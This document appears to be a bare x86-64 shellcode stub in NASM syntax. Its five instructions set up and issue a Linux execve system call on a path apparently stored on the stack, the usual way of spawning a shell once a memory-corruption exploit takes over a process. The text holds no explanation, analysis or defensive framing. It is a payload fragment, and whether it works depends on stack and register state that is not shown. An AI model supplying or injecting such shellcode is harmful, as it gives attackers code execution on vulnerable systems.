[BITS 64]
xor esi, esi            
cdq
lea rdi, [rsp-0x20]
mov al, 0x3b            
syscall  